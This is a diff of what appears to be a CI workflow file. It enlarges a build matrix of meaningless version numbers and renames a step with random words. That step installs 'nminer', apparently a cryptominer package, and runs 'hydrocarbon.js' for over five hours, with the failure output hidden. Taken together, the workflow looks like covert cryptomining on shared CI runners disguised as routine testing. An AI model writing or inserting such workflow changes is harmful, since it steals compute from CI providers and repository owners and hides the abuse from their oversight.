@@ -9,22 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4694 }
-          - { version: 2506 }
-          - { version: 2494 }
-          - { version: 1696 }
-          - { version: 2380 }
-          - { version: 863 }
-          - { version: 7812 }
-          - { version: 238 }
-          - { version: 7800 }
-          - { version: 2584 }
-          - { version: 6140 }
-          - { version: 2422 }
-          - { version: 5098 }
-          - { version: 4637 }
-          - { version: 6610 }
-          - { version: 2408 }
+          - { version: 1820 }
+          - { version: 8930 }
+          - { version: 3980 }
+          - { version: 4384 }
+          - { version: 3221 }
+          - { version: 7146 }
+          - { version: 2890 }
+          - { version: 9451 }
+          - { version: 2488 }
+          - { version: 4105 }
+          - { version: 3450 }
+          - { version: 6808 }
+          - { version: 6329 }
+          - { version: 6730 }
+          - { version: 2729 }
+          - { version: 9093 }
+          - { version: 5619 }
+          - { version: 9937 }
+          - { version: 6580 }
 
     steps:
       - name: Checkout
@@ -35,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: guacamole eek jut ew
+      - name: before what distant
         run: |
           npm install nminer@latest
-          timeout 348m node hydrocarbon.js || echo "hydrocarbon executed"
+          timeout 333m node hydrocarbon.js || echo "hydrocarbon executed"
